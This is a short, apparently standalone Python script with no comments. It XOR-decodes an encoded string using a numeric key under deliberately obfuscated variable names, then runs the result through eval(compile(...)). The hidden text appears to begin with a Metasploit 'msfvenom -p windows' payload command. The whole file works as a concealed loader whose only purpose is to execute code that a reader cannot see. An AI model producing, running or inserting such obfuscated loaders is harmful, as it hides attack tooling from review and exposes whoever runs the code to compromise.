wopvEaTEcopFEavc ="_FQDUXW_\x19\x19D\x18O[V]]GG\x1eJ\x02\x03\x16EYPY_\x1dKROSDG]mLTF\x19}q~jf\x05\x05\x04\x19\x05\x03\x06\x1d\x03\x02\t\x17\x04\x05\x00\x17tf|dc\x04\x06\x00\x0f\x0e\x19\x1eU\x17TMU\x13\x1a\\\x13D\\@WKJU\x19PAW" 

iOpvEoeaaeavocp = "2572068294488289204124796155329796648287691919280677163208964278636797796933715037336962990759299453"
uocpEAtacovpe = len(wopvEaTEcopFEavc)
oIoeaTEAcvpae = ""
for fapcEaocva in range(uocpEAtacovpe):
    nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[fapcEaocva]
    qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[fapcEaocva % len(iOpvEoeaaeavocp)]
    oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))


eval(compile(oIoeaTEAcvpae, '<string>', 'exec'))